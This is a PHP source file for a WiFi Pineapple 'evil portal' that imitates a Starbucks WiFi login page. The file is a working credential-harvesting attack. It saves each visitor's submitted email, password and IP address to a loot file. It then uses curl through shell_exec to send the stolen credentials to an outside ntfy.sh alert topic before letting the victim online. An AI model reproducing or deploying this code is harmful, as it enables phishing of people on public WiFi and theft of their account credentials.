<?php
namespace evilportal;

// Suppress warnings from Portal.php reading missing temp files
error_reporting(E_ERROR | E_PARSE);

header("Cache-Control: no-store, no-cache, must-revalidate");

// Create temp files if they do not exist
@touch("/tmp/EVILPORTAL_CLIENTS.txt");
@touch("/tmp/EVILPORTAL_PROCESSED.txt");

require_once("/pineapple/ui/modules/evilportal/assets/api/Portal.php");
require_once("MyPortal.php");

$ntfy_enabled = 1;
$ntfy_topic = "garmr_alerts";

$loot_file = "/root/loot/garmr/credentials.txt";
$email = isset($_POST["email"]) ? $_POST["email"] : "";
$password = isset($_POST["password"]) ? $_POST["password"] : "";
$client_ip = $_SERVER["REMOTE_ADDR"];
$timestamp = date("Y-m-d H:i:s");

@mkdir("/root/loot/garmr", 0755, true);

if (!empty($email)) {
    $entry = "[$timestamp] Starbucks | IP: $client_ip | Email: $email | Password: $password\n";
    file_put_contents($loot_file, $entry, FILE_APPEND);
    
    // NTFY notification
    if ($ntfy_enabled && !empty($ntfy_topic)) {
        $msg = "STARBUCKS CREDS!\nEmail: $email\nPassword: $password\nIP: $client_ip";
        shell_exec("curl -s -H \"Title: GARMR Capture\" -H \"Priority: high\" -H \"Tags: coffee,key\" -d " . escapeshellarg($msg) . " https://ntfy.sh/" . escapeshellarg($ntfy_topic) . " >/dev/null 2>&1 &");
    }
    
    $portal = new MyPortal((object)$_POST);
    $portal->authorizeClient($client_ip);
}

header("Location: /success.html");
exit;
